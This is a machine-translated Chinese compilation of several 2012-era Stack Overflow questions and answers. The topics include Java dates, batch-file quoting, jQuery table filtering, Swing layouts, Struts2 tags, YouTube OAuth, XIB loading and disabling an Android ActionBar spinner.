[http://www.php.net/manual/en/intro.gearman.php](http://www.php.net/manual/en/intro.gearman.php)

# java - nsdate 的 java 等价物

> ID：13343817
> 
> 赞同：0
> 
> 时间：2012-11-12T12:36:55.390
> 
> 标签：java, android, nsdate

“NSDate 时间戳”看起来像“2012-12-11 18:30:41 - 400”。java时间戳只是一个长整数（例如：“276712445500”）。

那么，nsdate 的 Java 等价物是什么？

提前致谢 。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:40:17.693

这取决于您所说的“看起来像”是什么意思。您可以使用 a (例如)获得*a 的字符串表示形式*。不过，您想自己设置时区。`java.util.Date``DateFormat``SimpleDateFormat`

我相信内部结构`NSDate`基本上等同于`java.util.Date`，基于[文档](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDate_Class/Reference/Reference.html)：

> NSDate 的唯一原始方法 timeIntervalSinceReferenceDate 为 NSDate 接口中的所有其他方法提供了基础。此方法返回一个相对于绝对参考日期的时间值——格林威治标准时间 2001 年 1 月 1 日的第一个瞬间。

换句话说，该值并不“知道”它与 UTC 等的偏移量……它只是一个时间点。（epoch 和 scale 可能与 不同`java.util.Date`，但这是实现上的差异，而不是概念上的差异。）

然而，尽管如此，我还是强烈建议您使用[Joda Time](http://joda-time.sf.net)进行 Java 中的所有日期/时间操作。这是一个*比*`java.util.Date`/更好的 API `Calendar`。

# router - 如何使用 WRT-54GL 直接连接到互联网

> ID：13343820
> 
> 赞同：0
> 
> 时间：2012-11-12T12:37:09.977
> 
> 标签：router, firmware

我有一个 WRT-54GL、一个 Thomson DSL 调制解调器/路由器和一个 DSL 线路 (PPPoE)。我目前将 Thomson 连接到互联网，并通过其 WAN 端口在 Thomson 和我的 LAN 之间使用 WRT。但是，汤姆森路由器很糟糕，甚至无法正确进行端口转发。

我的问题是：（如何）我可以使用 Thomson 的调制解调器将 WRT 直接连接到互联网吗？我希望 WRT 获取外部 IP 和所有流量，因此 Thomson 尽可能少地工作，如果可以的话，甚至只是中继数据包。否则，我无法以任何方式转发任何端口，因为 Thomson 已损坏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-24T00:28:36.157

你快到了，但最好从头开始。

1° 您需要一个调制解调器来连接您的网络，所以是的，您确实需要 thomson 或其他兼容设备。

2° 你至少需要一个防火墙。

配置：

WRT防火墙和无线启用

汤姆森防火墙和无线禁用

禁用 thomson 防火墙，仅使用 WRT 防火墙，以获取安全建议 切勿直接与 thomson 连接，因为您不会受到包括无线网络在内的任何防火墙的保护，因此请在 thomson 上禁用无线网络。

您也可以通过 telnet 命令执行更改，在某些路由器中这是唯一的方法。如果我知道型号，我可以为您提供更多帮助。

# batch-file - 批处理脚本中的空格

> ID：13343825
> 
> 赞同：1
> 
> 时间：2012-11-12T12:37:19.683
> 
> 标签：batch-file, whitespace

我正在尝试创建一个用空格传递参数的批处理文件。

```
::create mono PCX file
"C:\Program Files\gs\gs9.06\bin\gswin64.exe" -q -dNOPAUSE -dSAFER -dBATCH -sPAPERSIZE=%3 -r200 -g1728x2285 -sDEVICE=pcxmono -sOutputFile="%~dpn2._temp_.%%d.pcx" "%1" -c quit

::create zip file
7za a "%2" "%~dpn2._temp_.*.pcx" 
```

我的问题是，如果 %1="test case.zip" 我只能得到 test.zip。有什么方法可以让 Windows cmd.exe 解释器在 %2 中正确传递带有空格的参数？

最好的。愿望

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T13:58:17.177

报价是一个状态机——第一个报价打开引用，第二个关闭，第三个打开，等等。

你的问题是周围的引号`"%1"`。

您在`"test case.zip"`命令行上输入，所以`%1`= `"test case.zip"`，添加的引号导致`""test case.zip""`. 您的参数不再正确引用，因此解析器看到 2 个参数：

1.  `""test`
2.  `case.zip""`

您需要做的就是删除代码中的引号：`"%1"`-->`%1`

另一种选择是`~`在添加自己的: 之前使用修饰符删除任何现有的封闭引号`"%~1"`。如果参数未用引号括起来，`~`则修饰符无效。

# javascript - JQuery - 搜索 HTML 表格 - 行跨度问题

> ID：13343826
> 
> 赞同：1
> 
> 时间：2012-11-12T12:37:21.823
> 
> 标签：javascript, jquery, html, jsp, html-table

但是，我有一个与此结构类似的 HTML 表：

*   行跨度不是固定大小
*   给定表中可以有多个行跨度（每个可以有不同的长度）
*   该表已生成

[JSFiddle](http://jsfiddle.net/ruHjT/1/)

```
<table border="0" cellpadding="0" cellspacing="0">
    <tbody>
        <tr>
            <td>
                <label for="searchbox">Search:</label>
                <input type="text" id="filter1" />
            </td>
        </tr>

    </tbody>
</table>
<table id="foo" border="1px">
    <tr> 
        <th>A</th>
        <th>B</th>
        <th>C</th>
        <th>D</th>
        <th>E</th>
    </tr>
    <tbody id="data">
    <tr>
        <td class="col1" rowspan="2">1</td>
        <td>2</td>
        <td>3</td>
        <td>4</td>
        <td>5</td>
    </tr>
    <tr>
        <td>6</td>
        <td>7</td>
        <td>8</td>
        <td>9</td>
    </tr> 
     <tr>
        <td class="col1">v</td>
        <td>w</td>
        <td>x</td>
        <td>y</td>
        <td>z</td>
    </tr>
</table> 
```

使用第一列完成搜索。使用下面描述的搜索/过滤功能时，我遇到了行跨度问题：

```
<script language="javascript" type="text/javascript">
    $(function() {    
     $('#filter1').change(function() { 
     $("#foo td.col1:contains('" + $(this).val() + "')").parent().show();
     $("#foo td.col1:not(:contains('" + $(this).val() + "'))").parent().hide();
     }); 
  });
</script> 
```

问题是当输入将隐藏所有行的搜索词时**'1'**（例如搜索**'v'**） - 只有行跨度的第一行被隐藏，而行跨度的所有后续行部分仍然存在。所以行 [6,7,8,9] 将永远保留。

示例表：

> ```
> [1 - 2,3,4,5]
> [  - 6,7,8,9]
> [v - w,x,y,z] 
> ```

搜索“ **1** ”（正确）：

> ```
> [1 - 2,3,4,5]
> [  - 6,7,8,9] 
> ```

搜索“ **v** ”（不正确）：

> ```
> [  - 6,7,8,9]  <- this row should not be returned 
> [v - w,x,y,z] 
> ```

如何正确隐藏这些子行跨度？

**更新：** 我认为解决方案在于根据行数添加不同的类，然后使用适当数量的 .parent().next(i).hide() 以不同方式处理这些类的函数 - 尽管我不是确定如何做到这一点以及这种方法是否正确。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T17:02:11.287

`Rowspan`ed`td`不是`tr`它们似乎属于的所有元素的子元素。DOM 树中的所有元素可能只有一个直接父级，在您的情况下，它是`tr`HTML 中显示的直接父级。

考虑到这一点，我建议您使用`div`s 或此类来进行设计，这将使您可以更自然地进行此类操作。

无论如何，无需更改您的 HTML，您可以对行索引及其`rowspan`属性进行一些补偿，检查它是否有用：

```
$(function() {
    $('#filter1').change(function() {
        var toShow = $("#data td.col1:contains('" + $(this).val() + "')");
        $("#data tr").not( $('#data tr').has(toShow) ).hide();
        toShow.each(function() {
            var rspan = $(this).attr('rowspan'),
                father = $(this).parent();
            if (rspan && +rspan > 1) {
                father.nextUntil(':nth-child(' + (father.index() + (+rspan) + 1) + ')').andSelf().show();
            } else father.show();
        });
    });
}); 
```

[**小提琴**](http://jsfiddle.net/ruHjT/4/)

# c# - 应用程序请求路由问题

> ID：13343827
> 
> 赞同：1
> 
> 时间：2012-11-12T12:37:29.997
> 
> 标签：c#, .net, wcf, iis

我在两个不同的服务器上安装了两个 Web 服务。我想使用应用程序请求路由 (ARR) 来启用两个服务之间的负载平衡和可用性。这些服务中的每一个都使用 ClientCredentialType=username 的消息安全性。他们每个人都“单独”工作得很好，但是当我使用统一的 WS（我从 ARR 中得到的那个）时，它给了我一个安全异常，详细信息：“无法打开安全通道，因为与远程端点的安全协商失败。这可能是由于用于创建通道的 EndpointAddress 中缺少或错误指定了 EndpointIdentity。请验证 EndpointAddress 指定或暗示的 EndpointIdentity 是否正确标识了远程端点。"

ARR 不能将证书信息传输到目标 Web 服务吗？我在这里错过了什么吗？！

# struts2 - Struts 2 文本字段标签未显示在表格中

> ID：13343828
> 
> 赞同：1
> 
> 时间：2012-11-12T12:37:31.633
> 
> 标签：struts2, tags, textfield

以下使用 struts2 标记的 jsp 文件片段不显示文本字段标签。我怎样才能解决这个问题？是否可以仅使用 struts2 标签显示标签？

```
<s:form action="voucher" theme="simple">
    <table  width=50% border="5"> 
      <tr>
          <td>
         <s:textfield label="Enter the voucher hrn"  name="voucher.SN" />
          </td>
          <td>
         <s:submit value="Check state" />
          </td>
      </tr>
      <tr>
          <td>
         <s:radio  list="#{'used': 'Mark as used', 'available': 'Mark as available'}" name="selections" value="%{'used'}"></s:radio>
          </td>
          <td>
         <s:submit value="Update state" />
          </td>
      </tr>
        </table>
</s:form> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:55:16.083

这是因为您`simple`在表单中使用了主题。`theme="simple"`从标签中删除，`<s:form>`然后 Struts2 将为您进行表格布局以及字段错误和标签。
顺便说一句，如果您真的需要使用自定义布局，请使用`<s:label>`标签作为标签。

# java - Java Swing - JTable 未显示

> ID：13343829
> 
> 赞同：3
> 
> 时间：2012-11-12T12:37:32.943
> 
> 标签：java, swing, jtable, jpanel, flowlayout

我在使用 Java Swing 时遇到了一些麻烦。我正在尝试制作一个顶部带有控制面板的框架，其中包含一些按钮。在此之下，我想要一个 JTable 来显示

我一直在尝试，但桌子没有显示。如果我删除顶部的 controlPanel，它有时会显示，有时不会。我在 JTable 的构造函数中使用的代码是在同一个应用程序中提供的，所以它不是网络错误

```
public ServerMainFrame(GuiController gc){
    this.gc = gc;
    initGUI();
}

private void initGUI() {
    System.out.println("initiating GUI");
    createFrame();
    addContentPanel();
    addControls();
    //openPopUpServerSettings();
    addSongTable();
}

private void createFrame()
{
    this.setTitle("AudioBuddy 0.1");
    this.setVisible(true);
    this.setDefaultCloseOperation(EXIT_ON_CLOSE);
    this.setSize(800, 600);
    this.setResizable(false);
    this.setLocationRelativeTo(null);
}

private void addContentPanel()
{
    JPanel p = new JPanel();
    p.setLayout(new FlowLayout());
    p.setSize(new Dimension(800, 600));
    this.setContentPane(p);
}

private void addControls()
{
    JPanel controlPanel = new JPanel();
    controlPanel.setLayout(new FlowLayout());
    controlPanel.setBorder(BorderFactory.createLineBorder(Color.black));
    controlPanel.setSize(700,100);

    // Buttons
    JButton play = new JButton("Play");
    JButton pause = new JButton("Pause");
    JButton stop = new JButton ("Stop");
    JButton next = new JButton("Next");
    JButton prev = new JButton("Previous");     
    controlPanel.add(play);
    controlPanel.add(pause);
    controlPanel.add(stop);
    controlPanel.add(next);
    controlPanel.add(prev);

    // Currently playing
    JLabel playing = new JLabel("Currently playing:");
    controlPanel.add(playing);

    JLabel current = new JLabel("Johnny Cash - Mean as Hell");
    controlPanel.add(current);

    this.getContentPane().add(controlPanel);
}

private void addSongTable()
{
    JTable songTable = new JTable(Server.getSongTableModel());
    songTable.setVisible(true);
    JPanel tablePanel = new JPanel();
    tablePanel.setVisible(true);
    tablePanel.add(songTable);
    songTable.repaint();
    this.getContentPane().add(tablePanel);

    JButton btnMulticastList = new JButton("send list to clients");
    btnMulticastList.addActionListener(new ActionListener() {

        @Override
        public void actionPerformed(ActionEvent arg0) {
            Server.MulticastPlaylist();
        }
    });

    getContentPane().add(btnMulticastList);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T12:51:03.707

如果您想在窗口顶部进行控件，并且表格占据了窗口的大部分，那么我建议您尝试使用`BorderLayout`而不是`FlowLayout`. 像这样创建它...

```
private void addContentPanel()
{
    JPanel p = new JPanel();
    p.setLayout(new BorderLayout());
    p.setSize(new Dimension(800, 600));
    this.setContentPane(p);
} 
```

并通过在`BorderLayout`. 在这种情况下，控件应以最小尺寸添加到顶部...

```
this.getContentPane().add(controlPanel,BorderLayout.NORTH); 
```

桌子应该在中间，填满剩余的窗口空间......

```
this.getContentPane().add(tablePanel,BorderLayout.CENTER); 
```

就您而言，底部还有一个按钮...

```
getContentPane().add(btnMulticastList,BorderLayout.SOUTH); 
```

对于您所追求的布局，`BorderLayout`更为合适。在这里使用的好处`BorderLayout`是组件应该自动调整到窗口的大小，并且您明确说明每个组件所在的位置，因此面板不应该*出现*。

我还建议您找到调用`getContentPane()`所有方法的替代方法。也许考虑为主面板保留一个全局变量，像这样......

```
private mainPanel;

private void addContentPanel()
{
    mainPanel = new JPanel(new BorderLayout());
    mainPanel.setSize(new Dimension(800, 600));
    this.setContentPane(mainPanel);
} 
```

然后，当您想要将`add()`组件添加到面板时，您可以直接引用面板。

最后，我还建议`GridLayout`您使用控件，因为它可以让您将所有按钮放入其中，并且它们的大小相同以保持一致性。像这样定义它以允许水平对齐的 5 个按钮...

```
JPanel controlPanel = new JPanel(new GridLayout(5,1)); 
```

然后您只需正常使用添加按钮`controlPanel.add(button)`，它们将被添加到网格中的下一个插槽。

有关更多信息，请阅读有关[GridLayout](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/GridLayout.html)或[BorderLayout](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/BorderLayout.html)的信息，或者仅查看 Java 教程以[获取布局管理器的可视化指南，](http://docs.oracle.com/javase/tutorial/uiswing/layout/visual.html)以了解您有哪些替代方案以及最适合您情况的替代方案。一般来说，我尽量避免使用`FlowLayout`，因为我发现`LayoutManager`在大多数情况下还有其他更合适的 s。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-12T12:49:21.183

> 如果我删除顶部的 controlPanel，它有时会显示，有时不会。

*   一切都隐藏在其中`Server.getSongTableModel()`，没有人知道不发布带有硬编码值返回的[SSCCE](http://sscce.org/)

*   GUI[在 Swing 中存在并发问题](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)

*   XxxModel 在构建 GUI 时不断加载数据，然后异常导致描述的问题

> 我在 JTable 的构造函数中使用的代码是在同一个应用程序中提供的，所以它不是网络错误

*   不知道你在说什么

*   必须创建一个空的 GUI，请参阅[InitialTread](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/initial.html)

*   显示 GUI，然后开始将数据加载到[JTable](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html)

*   然后从`SwingWorker`或（描述网络问题）更好地启动Workers Thread（Backgroung Task） `Runnable#Thread`（便于捕获异常和处理单独的线程）

*   Swing GUI 的输出`Runnable`必须包装到`invokeLater()`

# asp.net - 使用 OAuth 进行身份验证并将视频上传到 asp.net 中的 youtube

> ID：13343834
> 
> 赞同：2
> 
> 时间：2012-11-12T12:37:55.907
> 
> 标签：asp.net, oauth-2.0, google-authentication

我想使用 API 将视频上传到 youtube。此外，我正在使用 OAuth2 身份验证来验证用户身份，但我无法弄清楚我哪里出错了。

我想在这里提一下，现在我正在我的本地主机上测试它，所以我的重定向 url 是本地主机，我没有 consumer_key 和 consumer_secret 但我使用的是 HMAC-SHA1 签名方法（对于未注册的域）但这里我没有参数选项提供签名方法

任何人都可以帮助我从中得到正确的东西吗？这是我编写的以下代码：

```
 Dim CONSUMER_KEY As String = "anonymous"
    Dim CONSUMER_SECRET As String = "anonymous"
    Dim SCOPE As String = "https://gdata.youtube.com"

    Dim parameters As OAuth2Parameters = New OAuth2Parameters
    With parameters
        .ClientId = ConfigurationManager.AppSettings.GetValues("ClientID").ToString
        .ClientSecret = ConfigurationManager.AppSettings.GetValues("ClientSecret").ToString
        .Scope = SCOPE
        .RedirectUri = "http://localhost:13332/Default.aspx"
    End With

    Dim authorizationUrl As String = OAuthUtil.CreateOAuth2AuthorizationUrl(parameters)
    Dim AccessCode As String = authorizationUrl
    parameters.AccessCode = AccessCode
    OAuthUtil.GetAccessToken(parameters)  ' **HERE I GOT ERROR ERROR AS The remote server returned an error: (400) Bad Request.**

    Dim developerKey As String
    developerKey = ConfigurationManager.AppSettings.GetValues("developerKey").ToString
    Dim settings As YouTubeRequestSettings = New YouTubeRequestSettings("MyApp", developerKey, "AuthSubToken(I don't have it)")
    Dim request As YouTubeRequest = New YouTubeRequest(settings)

    'UPLOAD YOUTUBE VIDEO METADATA
    Dim NewVideo As New Video
    NeWvideo.Title = "My Test Movie"
    NeWvideo.Tags.Add(New MediaCategory("Autos", YouTubeNameTable.CategorySchema))
    NeWvideo.Keywords = "cars, funny"
    NeWvideo.Description = "My description"
    NeWvideo.YouTubeEntry.Private = False
    NeWvideo.Tags.Add(New MediaCategory("mydevtag, anotherdevtag", YouTubeNameTable.DeveloperTagSchema))
    'NeWvideo.YouTubeEntry.Location = New GeoRssWhere(37, -122)

    Dim FormUploadToken As FormUploadToken = request.CreateFormUploadToken(NeWvideo)
    Dim UploadUrl As String = FormUploadToken.Url
    Dim UploadToken As String = FormUploadToken.Token

    Session("posturl") = UploadUrl
    Session("posttoken") = UploadToken 
```

此外，我无法获得将用户重定向到谷歌登录页面以验证自己并授予对我的 Web 应用程序的访问权限的过程。

在这里，我的要求是使用基于浏览器的上传到特定用户帐户而不是单个帐户以及使用 OAuth2 身份验证过程将视频上传到 youtube。

请帮我找出错误并在这里为我提供解决方案？提前致谢。

# html - html MetroApp 中的自定义光标

> ID：13343837
> 
> 赞同：0
> 
> 时间：2012-11-12T12:38:07.180
> 
> 标签：html, windows-8, microsoft-metro, winjs, internet-explorer-10

好吧，这是一个三合一的问题。

我正在尝试使用 html5 + winjs [for apptivate为 Windows 8 构建游戏](http://apptivate.ms/apps/1221/twisted-potions)为 Windows 8 构建游戏，但我被光标卡住了。

据我所知，IE10 与 CUR/ANI 以外的其他格式不兼容。WinJS 是否提供其他任何东西来使用 png 作为 ani？

如果我必须使用 CUR/ANI，两者都有 alpha 通道吗？

最后，有人可以推荐我一个将 png 转换为 cur/ani 的工具吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-01T18:01:07.860

在光标属性中使用默认值 -

```
 cursor:url(focus.ani),default; 
```

这将设置任何类型的光标 cur/ani & 具有跨浏览器支持。

# javascript - DOM 异常：HIERARCHY_REQUEST_ERR (3) 错误

> ID：13343839
> 
> 赞同：0
> 
> 时间：2012-11-12T12:38:10.337
> 
> 标签：javascript, jquery, internet-explorer-9, domexception

以下代码在 chrome 和 Firefox 中运行良好，但在 IE 9.0 中中断。

> `message.nodeTree.childNodes[1].childNodes[0].childNodes[0].appendChild(pkf_util.createXmlTextNode(text));`

当我尝试通过 textarea 输入内容时，它带有 SCRIPT5022：

> DOM 异常：HIERARCHY_REQUEST_ERR (3) 第 481 行字符 29；

任何想法为什么它不能在 IE 9.0 中工作？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-05-02T12:05:32.230

我知道自问 Q 以来已经很长时间了，但我是根据错误消息到达它的。特别是在我的情况下，我收到以下错误：“HIERARCHY_REQUEST_ERR：DOM 异常 3：一个节点被插入到它不属于的地方。”。

我试图将我使用 jquery 创建的节点附加到我的 html 文档中的其他节点。事实证明，我错误地使用`$('div')`而不是`$('<div>')`创建新的（附加的）节点。

我希望这对将来的某人有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-22T13:04:20.993

这可以是一个解决方案...

```
var element = document.createElement('iframe');
element.src = url;
document.getElementsByTagName('body')[0].appendChild(element); 
```

祝你好运

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T13:01:07.730

`DOM exception 3`意味着你试图将一个元素插入到 DOM 中不属于它的位置。（[参考](HTTP://developer.mozilla.org/en/docs/Web/API/DOMException)）

可能的原因：

*   IE9 不会将库创建的 XML 节点视为有效的 DOM 节点。
*   创建的节点是一个有效的 DOM 节点，但它被附加到它不属于的某个地方（例如附加到应该是叶子的节点的任何东西）
*   创建的节点实际上并不是一个新元素，而是附加到的节点的父节点。这将归类为库中的错误。
*   如果你试图在`null`任何地方附加一个，你实际上是在请求一个 DOM 异常。也许你的图书馆在 IE9 上失败了？

谷歌搜索`pkf_util`返回......这个问题，所以我们不能排除`pkf_util`.

# iphone - Objective-c - 从 XIB 文件中获取对象到视图控制器中

> ID：13343845
> 
> 赞同：-1
> 
> 时间：2012-11-12T12:38:31.113
> 
> 标签：iphone, objective-c, xib, viewcontroller

所以我有一个`XIB`文件，其中包含一个视图。在那个视图中，我想添加自定义对象，然后能够获取这些对象，并在我拥有其他东西的视图控制器中使用它们`programmatically`。

我的 XIB 文件称为`"MyXibLibrary.xib"` 我希望将对象添加到其中的视图控制器`"ContactDetailsViewController"`

我的视图控制器是这样推送的`UITableViewController`：

```
 ContactDetailsViewController *detailViewController = [[ContactDetailsViewController alloc] init]; 
```

在我的里面我`ContactDetailsViewController viewWillAppear`有这个代码来获取 XIB 对象：

```
 UIView *xibView = [[[NSBundle mainBundle] loadNibNamed:@"MyLib" owner:self options:nil] objectAtIndex:0];
    [self.view addSubview:xibView]; 
```

现在，例如，`loadNibNamed`属性应该是？XIB 文件的名称？该XIB文件中的视图名称？或者是什么？

所有这些都给我带来了错误，并且应用程序出现了异常。

`Objective-c`因为我对编码超级陌生，所以我不知道如何使用 XIB 文件。

任何帮助将非常感激！！！谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T13:40:03.070

XIB，被称为NIB（作为历史问题），定义了至少一个由视图控制器“控制”的视图。这个视图可以表示整个用户界面或只是另一个视图的子视图（例如，您的 XIB 可以表示可重用的表行）。因此，您*不应该*以您描述的方式将 XIB 用作预构建界面元素的一种容器。

但是，只要您的控制器知道它们，使用 XIB 的组件就很简单。也就是说，XIB 的元素应该连接到视图控制器类的属性。

例如，假设您有以下视图控制器界面：

```
#import <UIKit/UIKit.h>

interface MyViewController : UIViewController { 
}

@property (strong, nonatomic) IBOutlet UITextView *textEntry;
@property (strong, nonatomic) IBOutlet UIButton *enterButton; 
```

相应的 NIB 将被命名为`MyView.xib`。在界面构建器中，您可以将 NIB 的“文件所有者”设置为“MyViewController”。然后，您将界面元素、UITextView 和 UIButton 链接到 MyViewController 的属性（以您喜欢的任何方法 - 通常是选项+单击并从界面元素拖动到文件的所有者对象）。

完成此操作后，您可以在任何您喜欢的地方实例化视图控制器并使用该对象的属性。例如，假设这段代码在一个名为“SomeOtherController.m”的文件中：

```
- (void)aMethodOfSomeOtherController
{
  MyViewController *myView = [[MyViewController alloc] 
                              initWithNibName:@"MyViewController" 
                              bundle:nibBundleOrNil];

  NSString *buttonLabelText = [[[myView] enterButton] titleLabel] text];
  NSLog(@"Button label text = %@", buttonLabelText);

  [myView release];
} 
```

调用此方法时，`MyViewController`将创建一个实例，该实例将自动从 NIB 加载存储的对象并将它们绑定到视图控制器对象的属性。然后它将检索按钮标签的文本并将其写入日志控制台。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T12:44:03.237

如果您查看 的[文档`UIViewController`](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html)，则有一个名为`initWithNibName:bundle:`. 它列出了 Apple 提供的五个不同的示例代码项目，用于演示如何使用 xib 文件和视图控制器。你应该阅读其中的一些以获得基本的理解。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-12T12:47:52.720

如果您想`UIView`从 NIB 加载，此代码会更正确（因为您不知道 xib 文件中所需对象的索引）。

```
- (id)loadViewFromNIB:(NSString *)nibName owner:(id)owner class:(Class)_class
{
    NSArray *objects = [[NSBundle mainBundle] loadNibNamed:nibName owner:owner options:nil];

    for (id object in objects) {
        if ([object isKindOfClass:_class]) {
            return object;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-12T13:02:26.110

在界面生成器中打开 MyLib.xib 并检查您在该文件中是否确实有一个 UIView 组件。

您从异常中得到什么错误消息？

# jquery - 修复了不与页脚重叠的侧边栏

> ID：13343846
> 
> 赞同：0
> 
> 时间：2012-11-12T12:38:35.433
> 
> 标签：jquery

我正在尝试创建一个边栏，当我向上/向下滚动页面时，它仍然固定在它的位置。同时我希望它在到达页脚时停止滚动，以便侧边栏不会与页脚重叠。

我使用了这个插件[http://mojotech.github.com/stickymojo/](http://mojotech.github.com/stickymojo/) 但是，我在它的实现中犯了一些错误。有人可以帮我吗？

**编辑**

HTML

```
<div class="wrapper">
    <div id="sidebar"></div>
    <div id="content"></div>
</div>
<div id="footer"></div> 
```

CSS

```
.wrapper { width: 1000px }
#sidebar { float: left; width: 164px } 
```

页脚是从名为 footer.phtml 的文件中获取的，我已将其添加到 footer.phtml

```
<script type="text/javascript" src="js/stickyMojo.js"></script>
<script>
    $(document).ready(function(){
        $('#sidebar').stickyMojo({ footerID: '#footer', contentID: '#content' });
    });
</script> 
```

脚本stickyMojo.js 显示在资源中，但侧边栏不固定在它的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T15:32:00.957

查看您的代码，我相信这是您的内部没有导致 `#footer` *问题*`#wrapper`的事实。

这是一个你可以比较[的工作小提琴。](http://jsfiddle.net/CYRf5/)

**编辑**

这是包装器外的页脚[的小提琴。](http://jsfiddle.net/CYRf5/1/)

至于在用户滚动时加载额外的内容，插件似乎自动处理了“粘性” `#sidebar`。只需确保加载的内容会影响div`height`的内容。`#main`

这是一个演示如何做到这一点[的小提琴。](http://jsfiddle.net/CYRf5/3/)

# yii - 通过 Yii 信用卡支付

> ID：13343847
> 
> 赞同：0
> 
> 时间：2012-11-12T12:38:37.540
> 
> 标签：yii, credit-card

> **可能重复：**
> [Yii 中的信用卡交易](https://stackoverflow.com/questions/13269455/credit-card-transactions-in-yii)

我需要使用 Yii 在我的 php 网站中集成信用卡交易。我不知道我需要遵循哪些步骤来实施信用卡交易。当我在 Yii 中搜索有关信用卡交易的信息时，我收到了有关 paypal 集成的推荐信。还有其他方法可以实现吗？请帮助...提前谢谢

# android - 我可以禁用 ActionBar 的导航微调器吗？

> ID：13343852
> 
> 赞同：4
> 
> 时间：2012-11-12T12:38:51.507
> 
> 标签：android, android-actionbar

我想要实现的是禁用 ActionBar 上的所有项目，除了一个。我有一个来自 ListNavigation`ActionBar`的`Menu`、几个`TextViews`、一个`Button`和一个的自定义。`Spinner`Spinner 是因为`bar.setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);`这样创建的：

```
 SpinnerAdapter spinnerAdapter = new ArrayAdapter<String>(this.getActivity(), R.layout.action_bar_spinner, names);
    // "listener" for spinner
    bar.setListNavigationCallbacks(spinnerAdapter, new OnNavigationListener() {
        @Override
        public boolean onNavigationItemSelected(int position, long itemId) {
            // do some stuff

            return true;
        }
    }); 
```

我想禁用`Spinner`, 使其处于非活动状态，但在禁用它之前选择最后一个项目仍然可见。简而言之，`bar.getNavigationSpinner.setEnabled(false)`如果它存在，我需要类似的东西。问题是：是否有某种解决方法？如果没有，有没有办法禁用整个`ActionBar`，但保持可见？

注意：我想在片段中实现它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T23:45:06.997

是的，可以禁用`Spinner`在列表导航中使用的`ActionBar`。但这不是一个简单的解决方案，而是一个 hack。ActionBar 不提供对`Spinner`视图的直接访问。不幸的`Spinner`是，它是在没有任何 id 的私有代码中创建的。

那么如何访问`Spinner`实例呢？一种解决方案是通过 Java 反射 API 访问它，但我不建议这样做。

更好的解决方案是获取`Activity`当前`Spinner`. 由于`Spinner`in action bar大概是您自己没有创建的唯一一个，因此您应该能够将其与其他栏区分开来。

[这个 SO question](https://stackoverflow.com/questions/4486034/get-root-view-from-current-activity)`View`中描述了获取根目录。

遍历相当简单，请记住，如果您使用的是[ActionBarSherlock](http://actionbarsherlock.com/)，则必须寻找`IcsSpinner`而不是`Spinner`(`IcsSpinner`不扩展自`Spinner`)。

```
private View findActionBarSpinner() {
    View rootView = findViewById(android.R.id.content).getRootView();
    List<View> spinners = traverseViewChildren( (ViewGroup) rootView );
    return findListNavigationSpinner(spinners); // implement according to your layouts
}

private List<View> traverseViewChildren(ViewGroup parent) {
    List<View> spinners = new ArrayList<View>();
    for (int i = 0; i < parent.getChildCount(); i++) {
        View child = parent.getChildAt(i);
        if (child instanceof Spinner) {
            spinners.add( child );
        } else if (child instanceof IcsSpinner) { // add this if you are using ActionBarSherlock
            spinners.add( child );
        } else if (child instanceof ViewGroup) {
            spinners.addAll( traverseViewChildren( (ViewGroup) child ) );
        }
    }
    return spinners;
} 
```

该功能`findListNavigationSpinner`应该以您能够区分其他微调器的方式实现。如果您不使用任何`Spinner`（或任何从它派生的视图），则返回的列表应仅包含一项。

上面的代码描述了如何`Spinner`在`Activity`. 当然，`Spinner`在`Fragment`. 片段具有对其活动的引用，因此活动可以通过某些接口将代码公开给片段。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-31T10:25:44.247

上面的代码不适用于**Action Bar compat (v7 support library)**。我需要使用此支持库启用/禁用我的应用程序（API 2.2）的操作栏微调器，但我注意到该类的名称`SpinnerICS`改为`Spinner`.

完整的包名是

```
android.support.v7.internal.widget.SpinnerICS 
```

由于此类不可见且无法在我的代码中导入，因此无法使用：

```
if (child instanceof SpinnerICS) ... 
```

所以最后我用`getClass().getName`. 因此，使用 Action Bar 兼容支持库 (v7) 启用/禁用微调器的代码将是：

```
private List<View> traverseViewChildren(ViewGroup parent) {
    List<View> spinners = new ArrayList<View>();
    for (int i = 0; i < parent.getChildCount(); i++) {
        View child = parent.getChildAt(i);

        String className = child.getClass().getName();
        if (child instanceof Spinner || className.equals("android.support.v7.internal.widget.SpinnerICS")) {
            spinners.add( child );
        } else if (child instanceof ViewGroup) {
            spinners.addAll( traverseViewChildren( (ViewGroup) child ) );
        }
    }
    return spinners;
} 
```

另外，我修改了我的 findListNavigationSpinner 方法来检查微调器列表是否有要阻止的元素`ArrayIndexOutOfBoundsException`。因为我的应用程序中只有一个微调器（在操作栏兼容中），所以我的代码是这样的（如果你有多个微调器，你应该调整它）：

```
private View findListNavigationSpinner(List<View> spinners) {
    // We only have one spinner in the app
    View result = null;
    if (spinners != null && spinners.size() > 0) {
         result = spinners.get(0);
    }
    return result;
} 
```

* * *

## 回答 #3

> 赞同：1
